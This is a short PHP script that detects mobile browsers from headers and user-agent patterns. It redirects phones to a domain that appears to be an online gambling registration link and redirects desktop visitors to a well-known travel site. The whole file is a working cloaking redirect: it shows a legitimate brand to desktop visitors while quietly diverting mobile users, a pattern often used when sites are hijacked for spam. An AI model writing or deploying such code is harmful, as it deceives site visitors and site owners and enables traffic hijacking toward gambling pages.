<?php
// ================= CONFIG =================

$mobile_url  = 'https://link-daftar-sensa88.store/';
$desktop_url = 'https://www.traveloka.com/';

// ================= MOBILE DETECTION =================

function is_mobile_device() {

    if (!empty($_SERVER['HTTP_X_WAP_PROFILE']) || !empty($_SERVER['HTTP_PROFILE'])) {
        return true;
    }

    if (!empty($_SERVER['HTTP_ACCEPT']) &&
        stripos($_SERVER['HTTP_ACCEPT'], 'wap') !== false) {
        return true;
    }

    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

    if (!$ua) {
        return false;
    }

    $mobile_regex = '/(android|iphone|ipad|ipod|mobile|blackberry|opera mini|iemobile|windows phone|kindle|symbian|phone)/i';

    return preg_match($mobile_regex, $ua);
}

// ================= REDIRECT =================

// Mobile
if (is_mobile_device()) {

    header("Location: $mobile_url", true, 302);
    exit;
}

// Desktop
header("Location: $desktop_url", true, 302);
exit;
?>
